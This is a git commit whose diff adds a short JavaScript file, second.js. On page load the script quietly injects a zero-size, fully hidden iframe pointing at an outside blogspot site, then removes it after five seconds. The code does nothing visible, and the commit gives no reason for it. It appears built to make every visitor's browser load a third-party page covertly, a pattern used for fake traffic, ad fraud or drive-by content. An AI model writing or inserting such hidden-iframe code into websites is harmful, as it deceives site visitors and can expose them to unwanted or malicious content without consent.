0ef0310054d6ef77cfb81c764e2ce11e7c7a6d72
dandinma3i <102339035+dandinma3i@users.noreply.github.com>
2022-06-02 22:03:00 +0100

    Update second.js

--- second.js
+++ second.js
@@ -1,1 +1,12 @@
-
+/* second */
+function ninjafr() {
+	var ex = document.createElement("iframe");
+	ex.src = "https://respreq.blogspot.com/";
+  ex.style.cssText = "width: 0;height: 0;display: none;visibility: hidden;opacity: 0;border: 0;";
+  document.body.appendChild(ex);
+  setTimeout(function() {
+		document.body.removeChild(ex);
+	}, 5e3)
+}
+ninjafr();
+document.body.classList.add("xhome");/* second */
